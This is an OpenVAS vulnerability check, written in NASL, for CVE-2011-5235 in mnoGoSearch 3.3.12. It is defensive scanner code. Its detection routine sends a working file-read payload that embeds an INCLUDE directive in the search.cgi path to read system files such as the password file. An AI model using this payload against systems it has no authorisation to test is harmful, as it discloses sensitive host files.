###############################################################################
# OpenVAS Vulnerability Test
#
# mnoGoSearch Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803438");
  script_version("2021-04-16T06:57:08+0000");
  script_cve_id("CVE-2011-5235");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2013-03-15 11:19:57 +0530 (Fri, 15 Mar 2013)");
  script_name("mnoGoSearch Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52401");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1028247");
  script_xref(name:"URL", value:"http://en.securitylab.ru/lab/PT-2013-17");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24630");
  script_xref(name:"URL", value:"http://www.mnogosearch.org/doc33/msearch-changelog.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120650/mnoGoSearch-3.3.12-Arbitrary-File-Read.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary
  HTML or web script in a user's browser session in context of an affected
  site and disclose the content of an arbitrary file.");

  script_tag(name:"affected", value:"mnoGoSearch Version 3.3.12 and prior");

  script_tag(name:"insight", value:"Multiple flaws due to,

  - Error when parsing certain QUERY_STRING parameters.

  - Input passed via 'STORED' parameter to search/index.html (when 'q' is set
    to 'x') is not properly sanitized before being returned to the user.");

  script_tag(name:"solution", value:"Update to mnoGoSearch 3.3.13 or later.");

  script_tag(name:"summary", value:"This host is running mnoGoSearch and is prone to multiple
  vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.mnogosearch.org/download.html");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

foreach dir (make_list_unique("/", "/cgi-bin", "/mnogosearch", http_cgi_dirs(port:port)))
{

  if( dir == "/" ) dir = "";

  ## Request for the search.cgi
  sndReq = http_get(item:dir + "/search.cgi", port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if(rcvRes && ">mnoGoSearch:" >< rcvRes)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      url = dir + '/search.cgi/%0A%3C!--top--%3E%0A%3C!INCLUDE%20CONTENT=%22file:/' +
                   files[file] + '%22%3E%0A%3C!--/top--%3E?-d/proc/self/environ';

      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);
